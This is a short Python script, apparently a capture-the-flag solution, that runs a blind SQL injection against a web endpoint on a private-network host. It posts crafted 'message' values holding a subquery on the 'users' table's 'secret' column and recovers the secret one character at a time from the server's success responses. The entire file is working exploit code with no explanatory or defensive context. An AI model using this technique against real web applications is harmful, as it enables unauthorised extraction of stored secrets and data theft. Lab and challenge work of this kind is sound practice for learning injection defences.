import requests


list = [i for i in '{0123456789}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ']
url = 'http://192.168.124.210:5000/message'
flag=""
while True:
    for i in list:
        data = {
            'message':f"'+(select secret from users where secret like '%{i}%' and substr(secret,{len(flag)+1},1)='{i}')+'"
        }
        x = requests.post(url, data = data)
        if('{"success":true}' in x.text):
            flag += i
            print(flag)
            break
        if i=='Z':
            flag+="_"
            print(flag)
            break
    if "}" in flag:
        break